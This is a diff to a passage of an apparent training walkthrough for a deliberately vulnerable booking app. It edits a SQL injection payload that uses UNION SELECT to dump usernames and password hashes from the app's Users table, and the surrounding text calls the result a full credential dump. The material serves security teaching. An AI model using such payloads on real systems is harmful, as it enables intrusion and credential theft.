@@ -198,7 +198,7 @@ Rows where **Hotel = COLUMNS** reveal the column names in **User**: `Id`, `Usern
 Now the attacker knows the exact table and column names. Paste this final payload:
 
 ```
-%' OR '1'='1' UNION SELECT 1,'00000000-0000-0000-0000-000000000000',"Username",'00000000-0000-0000-0000-000000000000',"PasswordHash",NOW(),NOW(),'INJECTED',0.00,NOW(),'PWNED' FROM bookingdojo."Users" --
+%' OR '1'='2' UNION SELECT 1,'00000000-0000-0000-0000-000000000000',"Username",'00000000-0000-0000-0000-000000000000',"PasswordHash",NOW(),NOW(),'INJECTED',0.00,NOW(),'PWNED' FROM bookingdojo."Users" --
 ```
 
 In the results table, rows where **Hotel = PWNED** contain the full credential dump:
